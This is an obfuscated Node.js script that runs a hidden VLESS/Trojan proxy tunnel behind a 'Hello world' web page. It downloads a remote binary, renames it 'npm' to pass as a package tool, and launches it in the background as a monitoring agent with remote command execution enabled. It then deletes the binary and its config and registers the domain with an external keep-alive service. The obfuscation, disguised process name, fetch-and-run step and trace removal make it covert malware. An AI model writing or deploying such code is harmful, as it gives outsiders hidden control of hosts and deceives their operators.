const _0x795af8=_0x45a5;(function(_0x48a7b0,_0x5a605f){const _0x2ff564=_0x45a5,_0x440654=_0x48a7b0();while(!![]){try{const _0x5c90f5=-parseInt(_0x2ff564(0x1f6))/0x1+parseInt(_0x2ff564(0x24e))/0x2+-parseInt(_0x2ff564(0x1fc))/0x3+parseInt(_0x2ff564(0x1e1))/0x4+-parseInt(_0x2ff564(0x1d7))/0x5*(parseInt(_0x2ff564(0x230))/0x6)+parseInt(_0x2ff564(0x24f))/0x7+-parseInt(_0x2ff564(0x247))/0x8*(-parseInt(_0x2ff564(0x1f4))/0x9);if(_0x5c90f5===_0x5a605f)break;else _0x440654['push'](_0x440654['shift']());}catch(_0x156655){_0x440654['push'](_0x440654['shift']());}}}(_0x5797,0x85b00));const os=require('os'),http=require(_0x795af8(0x1ff)),fs=require('fs'),axios=require('axios'),net=require(_0x795af8(0x244)),path=require(_0x795af8(0x201)),crypto=require(_0x795af8(0x20b)),{Buffer}=require(_0x795af8(0x228)),{exec,execSync}=require('child_process'),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x795af8(0x21d)][_0x795af8(0x1fe)]||_0x795af8(0x1fd),NEZHA_SERVER=process[_0x795af8(0x21d)][_0x795af8(0x238)]||'',NEZHA_PORT=process[_0x795af8(0x21d)][_0x795af8(0x24a)]||'',NEZHA_KEY=process[_0x795af8(0x21d)][_0x795af8(0x245)]||'',DOMAIN=process['env'][_0x795af8(0x235)]||_0x795af8(0x21b),AUTO_ACCESS=process[_0x795af8(0x21d)]['AUTO_ACCESS']||!![],WSPATH=process[_0x795af8(0x21d)]['WSPATH']||UUID[_0x795af8(0x220)](0x0,0x8),SUB_PATH=process['env'][_0x795af8(0x1da)]||_0x795af8(0x217),NAME=process[_0x795af8(0x21d)][_0x795af8(0x240)]||_0x795af8(0x1fa),PORT=process[_0x795af8(0x21d)][_0x795af8(0x226)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x27f846=_0x795af8;try{const _0x2e950d=await axios[_0x27f846(0x22b)](_0x27f846(0x200)),_0x69120=_0x2e950d[_0x27f846(0x23b)];ISP=(_0x69120[_0x27f846(0x1e5)]+'-'+_0x69120[_0x27f846(0x1e9)])[_0x27f846(0x215)](/ /g,'_');}catch(_0x8722a){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x5ef738,_0x1000b1)=>{const _0x479e73=_0x795af8;if(_0x5ef738[_0x479e73(0x24d)]==='/'){const _0x2196bd=path[_0x479e73(0x1e8)](__dirname,_0x479e73(0x242));fs[_0x479e73(0x232)](_0x2196bd,'utf8',(_0x43910d,_0x2953f6)=>{const _0x5aba4a=_0x479e73;if(_0x43910d){_0x1000b1['writeHead'](0xc8,{'Content-Type':_0x5aba4a(0x1ec)}),_0x1000b1['end'](_0x5aba4a(0x20f));return;}_0x1000b1[_0x5aba4a(0x1d8)](0xc8,{'Content-Type':_0x5aba4a(0x1ec)}),_0x1000b1[_0x5aba4a(0x1f2)](_0x2953f6);});return;}else{if(_0x5ef738[_0x479e73(0x24d)]==='/'+SUB_PATH){const _0x28d50d=_0x479e73(0x212)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x479e73(0x1df)+DOMAIN+_0x479e73(0x1f0)+WSPATH+'#'+NAME+'-'+ISP,_0x342cae='trojan://'+UUID+'@'+DOMAIN+_0x479e73(0x1ea)+DOMAIN+_0x479e73(0x1df)+DOMAIN+_0x479e73(0x1f0)+WSPATH+'#'+NAME+'-'+ISP,_0x5395db=_0x28d50d+'\x0a'+_0x342cae,_0x3f79a6=Buffer['from'](_0x5395db)[_0x479e73(0x1e6)]('base64');_0x1000b1['writeHead'](0xc8,{'Content-Type':_0x479e73(0x246)}),_0x1000b1[_0x479e73(0x1f2)](_0x3f79a6+'\x0a');}else _0x1000b1['writeHead'](0x194,{'Content-Type':_0x479e73(0x246)}),_0x1000b1[_0x479e73(0x1f2)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x795af8(0x205))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x795af8(0x1f1),_0x795af8(0x219)];function resolveHost(_0x3ccd48){return new Promise((_0x59ca5b,_0x1b00a6)=>{const _0x132e18=_0x45a5;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x132e18(0x1e2)](_0x3ccd48)){_0x59ca5b(_0x3ccd48);return;}let _0x4f343a=0x0;function _0x268b76(){const _0x3fc330=_0x132e18;if(_0x4f343a>=DNS_SERVERS[_0x3fc330(0x225)]){_0x1b00a6(new Error(_0x3fc330(0x227)+_0x3ccd48+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x5db976=DNS_SERVERS[_0x4f343a];_0x4f343a++;const _0x232b42=_0x3fc330(0x1db)+encodeURIComponent(_0x3ccd48)+_0x3fc330(0x248);axios[_0x3fc330(0x22b)](_0x232b42,{'timeout':0x1388,'headers':{'Accept':_0x3fc330(0x1dc)}})[_0x3fc330(0x1fb)](_0x3976b6=>{const _0x5543ce=_0x3fc330,_0x7d61a8=_0x3976b6[_0x5543ce(0x23b)];if(_0x7d61a8[_0x5543ce(0x22c)]===0x0&&_0x7d61a8[_0x5543ce(0x21e)]&&_0x7d61a8['Answer'][_0x5543ce(0x225)]>0x0){const _0x43c119=_0x7d61a8[_0x5543ce(0x21e)][_0x5543ce(0x211)](_0x25d818=>_0x25d818[_0x5543ce(0x210)]===0x1);if(_0x43c119){_0x59ca5b(_0x43c119[_0x5543ce(0x23b)]);return;}}_0x268b76();})[_0x3fc330(0x21c)](_0x1e2cc7=>{_0x268b76();});}_0x268b76();});}function handleVlessConnection(_0x5d6a4f,_0x4af6f6){const _0xc96cbf=_0x795af8,[_0x737bc6]=_0x4af6f6,_0x16b1db=_0x4af6f6[_0xc96cbf(0x220)](0x1,0x11);if(!_0x16b1db[_0xc96cbf(0x1de)]((_0x5ceee5,_0x38b908)=>_0x5ceee5==parseInt(uuid[_0xc96cbf(0x221)](_0x38b908*0x2,0x2),0x10)))return![];let _0x492cee=_0x4af6f6['slice'](0x11,0x12)['readUInt8']()+0x13;const _0x4a69fb=_0x4af6f6[_0xc96cbf(0x220)](_0x492cee,_0x492cee+=0x2)[_0xc96cbf(0x23e)](0x0),_0x1364a8=_0x4af6f6[_0xc96cbf(0x220)](_0x492cee,_0x492cee+=0x1)['readUInt8'](),_0xa7dfb9=_0x1364a8==0x1?_0x4af6f6['slice'](_0x492cee,_0x492cee+=0x4)[_0xc96cbf(0x1e8)]('.'):_0x1364a8==0x2?new TextDecoder()[_0xc96cbf(0x22a)](_0x4af6f6[_0xc96cbf(0x220)](_0x492cee+0x1,_0x492cee+=0x1+_0x4af6f6[_0xc96cbf(0x220)](_0x492cee,_0x492cee+0x1)[_0xc96cbf(0x1f9)]())):_0x1364a8==0x3?_0x4af6f6[_0xc96cbf(0x220)](_0x492cee,_0x492cee+=0x10)[_0xc96cbf(0x23f)]((_0x2edbe8,_0x516ef0,_0x8af234,_0x10e214)=>_0x8af234%0x2?_0x2edbe8[_0xc96cbf(0x21a)](_0x10e214[_0xc96cbf(0x220)](_0x8af234-0x1,_0x8af234+0x1)):_0x2edbe8,[])[_0xc96cbf(0x1ef)](_0x4b1f83=>_0x4b1f83[_0xc96cbf(0x23e)](0x0)[_0xc96cbf(0x1e6)](0x10))[_0xc96cbf(0x1e8)](':'):'';_0x5d6a4f['send'](new Uint8Array([_0x737bc6,0x0]));const _0x553270=createWebSocketStream(_0x5d6a4f);return resolveHost(_0xa7dfb9)[_0xc96cbf(0x1fb)](_0x15f7e1=>{const _0x456b04=_0xc96cbf;net['connect']({'host':_0x15f7e1,'port':_0x4a69fb},function(){const _0x1b0166=_0x45a5;this[_0x1b0166(0x22e)](_0x4af6f6[_0x1b0166(0x220)](_0x492cee)),_0x553270['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x553270);})['on'](_0x456b04(0x1d5),()=>{});})[_0xc96cbf(0x21c)](_0x28d367=>{net['connect']({'host':_0xa7dfb9,'port':_0x4a69fb},function(){const _0x42f084=_0x45a5;this['write'](_0x4af6f6[_0x42f084(0x220)](_0x492cee)),_0x553270['on']('error',()=>{})[_0x42f084(0x1ed)](this)['on'](_0x42f084(0x1d5),()=>{})[_0x42f084(0x1ed)](_0x553270);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x51a81b,_0x5f157a){const _0x42ab39=_0x795af8;try{if(_0x5f157a[_0x42ab39(0x225)]<0x3a)return![];const _0x2eea9=_0x5f157a['slice'](0x0,0x38)[_0x42ab39(0x1e6)](),_0x4b36c7=[UUID];let _0x3945a0=null;for(const _0xdfa26b of _0x4b36c7){const _0xc44863=crypto['createHash'](_0x42ab39(0x224))['update'](_0xdfa26b)[_0x42ab39(0x22d)](_0x42ab39(0x24c));if(_0xc44863===_0x2eea9){_0x3945a0=_0xdfa26b;break;}}if(!_0x3945a0)return![];let _0x4e4734=0x38;_0x5f157a[_0x4e4734]===0xd&&_0x5f157a[_0x4e4734+0x1]===0xa&&(_0x4e4734+=0x2);const _0x32b996=_0x5f157a[_0x4e4734];if(_0x32b996!==0x1)return![];_0x4e4734+=0x1;const _0x270cde=_0x5f157a[_0x4e4734];_0x4e4734+=0x1;let _0x14ff32,_0xa1bf4;if(_0x270cde===0x1)_0x14ff32=_0x5f157a['slice'](_0x4e4734,_0x4e4734+0x4)[_0x42ab39(0x1e8)]('.'),_0x4e4734+=0x4;else{if(_0x270cde===0x3){const _0x34aeb5=_0x5f157a[_0x4e4734];_0x4e4734+=0x1,_0x14ff32=_0x5f157a[_0x42ab39(0x220)](_0x4e4734,_0x4e4734+_0x34aeb5)['toString'](),_0x4e4734+=_0x34aeb5;}else{if(_0x270cde===0x4)_0x14ff32=_0x5f157a[_0x42ab39(0x220)](_0x4e4734,_0x4e4734+0x10)[_0x42ab39(0x23f)]((_0x30b622,_0x3b7e49,_0x303450,_0x36d45b)=>_0x303450%0x2?_0x30b622[_0x42ab39(0x21a)](_0x36d45b['slice'](_0x303450-0x1,_0x303450+0x1)):_0x30b622,[])[_0x42ab39(0x1ef)](_0x34b699=>_0x34b699[_0x42ab39(0x23e)](0x0)['toString'](0x10))[_0x42ab39(0x1e8)](':'),_0x4e4734+=0x10;else return![];}}_0xa1bf4=_0x5f157a['readUInt16BE'](_0x4e4734),_0x4e4734+=0x2;_0x4e4734<_0x5f157a[_0x42ab39(0x225)]&&_0x5f157a[_0x4e4734]===0xd&&_0x5f157a[_0x4e4734+0x1]===0xa&&(_0x4e4734+=0x2);const _0xe23d6a=createWebSocketStream(_0x51a81b);return resolveHost(_0x14ff32)[_0x42ab39(0x1fb)](_0x55489a=>{net['connect']({'host':_0x55489a,'port':_0xa1bf4},function(){const _0x306be9=_0x45a5;_0x4e4734<_0x5f157a['length']&&this[_0x306be9(0x22e)](_0x5f157a[_0x306be9(0x220)](_0x4e4734)),_0xe23d6a['on'](_0x306be9(0x1d5),()=>{})[_0x306be9(0x1ed)](this)['on'](_0x306be9(0x1d5),()=>{})['pipe'](_0xe23d6a);})['on']('error',()=>{});})[_0x42ab39(0x21c)](_0x53f880=>{const _0x2af7b8=_0x42ab39;net[_0x2af7b8(0x1eb)]({'host':_0x14ff32,'port':_0xa1bf4},function(){const _0x3f4285=_0x2af7b8;_0x4e4734<_0x5f157a[_0x3f4285(0x225)]&&this[_0x3f4285(0x22e)](_0x5f157a[_0x3f4285(0x220)](_0x4e4734)),_0xe23d6a['on'](_0x3f4285(0x1d5),()=>{})[_0x3f4285(0x1ed)](this)['on'](_0x3f4285(0x1d5),()=>{})[_0x3f4285(0x1ed)](_0xe23d6a);})['on']('error',()=>{});}),!![];}catch(_0x4efe5e){return![];}}function _0x5797(){const _0x3b46c4=['vless://','utf-8','2053','replace','unlink','sub','close','1.1.1.1','concat','1234.abc.com','catch','env','Answer','config.yaml','slice','substr','npm\x20is\x20already\x20running,\x20skip\x20running...','once','sha224','length','PORT','Failed\x20to\x20resolve\x20','buffer','stream','decode','get','Status','digest','write','2083','60EQQIhZ','error:\x20','readFile','npm','2087','DOMAIN','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','NEZHA_SERVER','8443','443','data','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','client_secret:\x20','readUInt16BE','reduce','NAME','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','index.html','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','net','NEZHA_KEY','text/plain','24iqUqdI','&type=A','post','NEZHA_PORT','\x20-p\x20','hex','url','74660FEHKUZ','6198675ZhWELx','error','Server\x20is\x20running\x20on\x20port\x20','221405FqBgGx','writeHead','pop','SUB_PATH','https://dns.google/resolve?name=','application/dns-json','listen','every','&fp=chrome&type=ws&host=','https://arm64.ssss.nyc.mn/agent','1036056JvhWKw','test','writeFileSync','false','country','toString','includes','join','asOrganization',':443?security=tls&sni=','connect','text/html','pipe','https://oooo.serv00.net/add-url','map','&path=%2F','8.8.4.4','end','arm64','5424534IOciNS','arm','1045019HJduFt','finish','true','readUInt8','Hug','then','2863902UhuxpJ','a83c9448-8d3c-4562-9dff-c51151ce4ed1','UUID','http','https://speed.cloudflare.com/meta','path','log','https://amd64.ssss.nyc.mn/v1','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Server','npm\x20is\x20running','/bin/bash','https://','application/json','--tls','crypto','split','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','arch','Hello\x20world!','type','find'];_0x5797=function(){return _0x3b46c4;};return _0x5797();}wss['on']('connection',(_0x2b8429,_0x430ffe)=>{const _0x4ff83c=_0x795af8,_0x136c46=_0x430ffe['url']||'';_0x2b8429[_0x4ff83c(0x223)]('message',_0x517782=>{const _0x10a6d5=_0x4ff83c;if(_0x517782['length']>0x11&&_0x517782[0x0]===0x0){const _0x5dba7a=_0x517782[_0x10a6d5(0x220)](0x1,0x11),_0x43a7f1=_0x5dba7a['every']((_0x479a8e,_0x21cee4)=>_0x479a8e==parseInt(uuid['substr'](_0x21cee4*0x2,0x2),0x10));if(_0x43a7f1){!handleVlessConnection(_0x2b8429,_0x517782)&&_0x2b8429[_0x10a6d5(0x218)]();return;}}!handleTrojanConnection(_0x2b8429,_0x517782)&&_0x2b8429[_0x10a6d5(0x218)]();})['on'](_0x4ff83c(0x1d5),()=>{});});const getDownloadUrl=()=>{const _0xb6eb7b=_0x795af8,_0x51919b=os[_0xb6eb7b(0x20e)]();return _0x51919b===_0xb6eb7b(0x1f5)||_0x51919b===_0xb6eb7b(0x1f3)||_0x51919b==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':_0xb6eb7b(0x1e0):!NEZHA_PORT?_0xb6eb7b(0x203):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x5c4ddd=_0x795af8;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5cc6d4=getDownloadUrl(),_0x2e7014=await axios({'method':'get','url':_0x5cc6d4,'responseType':_0x5c4ddd(0x229)}),_0x42d875=fs['createWriteStream'](_0x5c4ddd(0x233));return _0x2e7014[_0x5c4ddd(0x23b)][_0x5c4ddd(0x1ed)](_0x42d875),new Promise((_0x2491c1,_0x4e6005)=>{const _0x3b791d=_0x5c4ddd;_0x42d875['on'](_0x3b791d(0x1f7),()=>{const _0x2d18fc=_0x3b791d;console[_0x2d18fc(0x202)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x56aa8e=>{if(_0x56aa8e)_0x4e6005(_0x56aa8e);_0x2491c1();});}),_0x42d875['on'](_0x3b791d(0x1d5),_0x4e6005);});}catch(_0x24bdbc){throw _0x24bdbc;}},runnz=async()=>{const _0x1fefc6=_0x795af8;try{const _0x597b4c=execSync(_0x1fefc6(0x20d),{'encoding':_0x1fefc6(0x213)});if(_0x597b4c['trim']()!==''){console[_0x1fefc6(0x202)](_0x1fefc6(0x222));return;}}catch(_0x27dfcf){}await downloadFile();let _0x40322d='',_0xd62c23=[_0x1fefc6(0x23a),_0x1fefc6(0x239),'2096',_0x1fefc6(0x234),_0x1fefc6(0x22f),_0x1fefc6(0x214)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xe3b769=_0xd62c23['includes'](NEZHA_PORT)?_0x1fefc6(0x20a):'';_0x40322d='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1fefc6(0x24b)+NEZHA_KEY+'\x20'+_0xe3b769+_0x1fefc6(0x241);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x22f804=NEZHA_SERVER[_0x1fefc6(0x1e7)](':')?NEZHA_SERVER[_0x1fefc6(0x20c)](':')[_0x1fefc6(0x1d9)]():'',_0x252ba3=_0xd62c23[_0x1fefc6(0x1e7)](_0x22f804)?_0x1fefc6(0x1f8):_0x1fefc6(0x1e4),_0x21e3c1=_0x1fefc6(0x23d)+NEZHA_KEY+_0x1fefc6(0x243)+NEZHA_SERVER+_0x1fefc6(0x236)+_0x252ba3+_0x1fefc6(0x204)+UUID;fs[_0x1fefc6(0x1e3)](_0x1fefc6(0x21f),_0x21e3c1);}_0x40322d=_0x1fefc6(0x237);}else{console['log'](_0x1fefc6(0x23c));return;}}try{exec(_0x40322d,{'shell':_0x1fefc6(0x207)},_0x237036=>{const _0x45d1a8=_0x1fefc6;if(_0x237036)console[_0x45d1a8(0x1d5)]('npm\x20running\x20error:',_0x237036);else console[_0x45d1a8(0x202)](_0x45d1a8(0x206));});}catch(_0x559983){console[_0x1fefc6(0x1d5)](_0x1fefc6(0x231)+_0x559983);}};async function addAccessTask(){const _0x1f4bf1=_0x795af8;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5440c3=_0x1f4bf1(0x208)+DOMAIN;try{const _0x4ee002=await axios[_0x1f4bf1(0x249)](_0x1f4bf1(0x1ee),{'url':_0x5440c3},{'headers':{'Content-Type':_0x1f4bf1(0x209)}});console[_0x1f4bf1(0x202)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4e53e6){}}const delFiles=()=>{const _0xe6fe5f=_0x795af8;fs[_0xe6fe5f(0x216)](_0xe6fe5f(0x233),()=>{}),fs[_0xe6fe5f(0x216)](_0xe6fe5f(0x21f),()=>{});};function _0x45a5(_0x5f5cd9,_0x4f829a){const _0x579723=_0x5797();return _0x45a5=function(_0x45a5cd,_0x4d1eaa){_0x45a5cd=_0x45a5cd-0x1d5;let _0x3c80b5=_0x579723[_0x45a5cd];return _0x3c80b5;},_0x45a5(_0x5f5cd9,_0x4f829a);}httpServer[_0x795af8(0x1dd)](PORT,()=>{const _0x4d13c9=_0x795af8;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x4d13c9(0x202)](_0x4d13c9(0x1d6)+PORT);});
